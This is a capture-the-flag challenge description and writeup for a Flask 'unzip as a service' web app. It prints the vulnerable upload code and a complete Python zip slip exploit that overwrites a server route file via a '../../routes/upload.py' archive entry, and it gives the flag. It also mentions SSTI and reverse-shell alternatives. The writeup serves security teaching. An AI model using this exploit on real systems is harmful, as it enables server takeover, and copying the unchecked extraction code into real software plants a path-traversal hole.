# ZaaS

p.s. For testing, go to [INSTALL.md](https://github.com/MasonCompetitiveCyber/PatriotCTF-2022/blob/main/Web/ZaaS/INSTALL.md)

### Description
I am in the process of making the next big social media platform but I have a history of implementing software insecurely. If you can get view the admin.html page, I will give you a flag. 

Due to market research, I think I found an opportunity. Nobody seems to know how to unzip files, so I made (un)Zip as a Service! I have learned from my mistakes, so I will be giving you the source code for the unzipping functionality (app/routes/upload.py) as well debug mode on so you can tell me how to fix my inevitably vulnerable code!

### Difficulty
6/10?

### Flag
`PCTF{y0u_s1ipp3ry_1itt13_bugg3r}`

### Hints
1. zip slip

### Author
Daniel Getter (NihilistPenguin)

### Tester
None yet

### Writeup

This is a zip slip vulnerabilty. Here is the important part of the code:
```python
@app.route('/upload', methods=['GET', 'POST'])
@login_required
def upload():
    if request.method=='POST':
        <snip>
        if not zipfile.is_zipfile(file):
            flash('The file you provided is not a zip!', 'danger')
            return redirect(url_for('upload'))
        
        filename = secure_filename(file.filename)
        upload_dir = app.config['UPLOAD_FOLDER'] + "/" + filename.rsplit('.', 1)[0]
        try:
            os.makedirs(upload_dir)
        except FileExistsError:
            flash('An extracted zip with this name already exists', 'danger')
            return redirect(url_for('upload'))

        with zipfile.ZipFile(file, "r") as zf:
            for f in zf.infolist():
                with open(os.path.join(upload_dir, f.filename), 'wb') as tf:
                    tf.write(zf.open(f.filename, 'r').read())
                 
        flash(f'Zip sucessfully unzipped. Download it by going to /upload/{filename.rsplit(".", 1)[0]}', 'success')
        return redirect(url_for('upload'))
    else:
        return render_template('upload.html', name=current_user.username)
```

Basically, it is unzipping the zip, and concatenating the filenames of the files inside into a predetermined upload directory. The issue is that the user can control the file names of the files in the zip, and thus can provide a `../` to traverse directories and the code does not check for this. This allows for a "zip slip" vulnerability. 

I will skip all the testing and enumeration needed to solve this, though I did include a bit of functionality that allows you to test retrieving a file from the `/upload/<zipslip_filename>` directory instead of the `/upload/upload_zip/filename`. Basically if you upload a zip with a file named `../test.txt` in a zip called `ziptest.zip`, you will be able to test that it worked by going to `/upload/test.txt`. It will also not show up if you go to `/upload/ziptest`.

 Here is the final script:
```python
from os import popen
import string
import requests
import io
import zipfile

SERVER_ADDR = "http://127.0.0.1:5000"

def get_cookie():
    data = {
        "username": "test", 
        "password": "test" 
    }

    req = requests.post(SERVER_ADDR+"/login", data=data)
    cookiejar = req.history[0].cookies
    cookie = cookiejar.get_dict()['session']

    return cookie

cookie = {"session": get_cookie()}

payload = """
import os
import zipfile

from app import app
from app.models import User
from flask import flash, redirect, render_template, request, url_for, send_from_directory, render_template_string # add this last import
from flask_login import current_user, login_required
from werkzeug.utils import secure_filename


@app.route('/upload', methods=['GET', 'POST'])
@login_required
def upload():
    if request.method=='POST':
        if 'file' not in request.files:
            flash('No file part', 'danger')
            return redirect(url_for('upload'))
        
        file = request.files['file']
        if file.filename == '':
            flash('No file selected', 'danger')
            return redirect(url_for('upload'))

        if not zipfile.is_zipfile(file):
            flash('The file you provided is not a zip!', 'danger')
            return redirect(url_for('upload'))
        
        filename = secure_filename(file.filename)
        upload_dir = app.config['UPLOAD_FOLDER'] + "/" + filename.rsplit('.', 1)[0]
        try:
            os.makedirs(upload_dir)
        except FileExistsError:
            flash('An extracted zip with this name already exists', 'danger')
            return redirect(url_for('upload'))

        with zipfile.ZipFile(file, "r") as zf:
            for f in zf.infolist():
                with open(os.path.join(upload_dir, f.filename), 'wb') as tf:
                    tf.write(zf.open(f.filename, 'r').read())
                 
        flash(f'Zip sucessfully unzipped. Download it by going to /upload/{filename.rsplit(".", 1)[0]}', 'success')
        return redirect(url_for('upload'))
    else:
        flag = open("./app/templates/admin.html").read()      # Change the normal return to render a string with 
        return render_template_string("{{flag}}", flag=flag)  # the contents of admin.html


@app.route('/upload/<dir>', methods=['GET'])
@login_required
def show_unzip(dir):
    path = app.config["UPLOAD_FOLDER"] + "/" + dir
    if os.path.isdir(path):
        files = os.listdir(path)
        return render_template('files.html', name=current_user.username, files=files)
    else:
        flash('That directory does not exist', 'danger')
        return redirect(url_for('upload'))

@app.route('/upload/<dir>/<name>', methods=['GET'])
@login_required
def serve_unzip(dir, name):
    path = f'{app.config["UPLOAD_FOLDER"]}/{dir}/{name}'
    if os.path.isfile(path):
        return send_from_directory(f'{app.config["UPLOAD_FOLDER"]}/{dir}', filename=name, as_attachment=True)
    else:
        flash('That file does not exist', 'danger')
        return redirect(url_for('upload'))
"""

fh = io.BytesIO()
with zipfile.ZipFile(fh, "a", zipfile.ZIP_DEFLATED, False) as zf:
    zf.writestr("../../routes/upload.py", payload)

r = requests.post(url=SERVER_ADDR + "/upload", files={"file": ('test.zip', fh.getvalue())}, cookies=cookie)
```

The first part gets us our session cookie so we can make requests (make sure to make a user first). Skip the payload for now. The final block of code will create a zipfile in memory (you can probably do it a different way, but this is nice and clean) with a file inside the zip with a filename of `../../routes/upload.py`. The contents of the file is defined in that huge payload string. This is literally just the upload.py file given in the challenge with a few changes marked with comments. Basically, we just want the `/upload` page to render the admin.html page when we GET request it.

Finally, we just post our request. Let's see what happens when we run it and go to the `/upload` page.
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF-2022/raw/main/writeup-images/zipslip_flag.png" width=70%  height=70%></p>


This can be solved other ways. Instead of overwriting the `upload.py` file, you can overwrite any `.py` want and use the same `render_template_string`. Also, instead of opening the `admin.html` file and rendering it, you can just do normal flask SSTI command execution and get a reverse shell or do the `{{config}}` thing from the `Not So Secret` challenge. You can also overwrite an html template file to just have a `{{}}` template inside instead of going the `render_template_string` route.
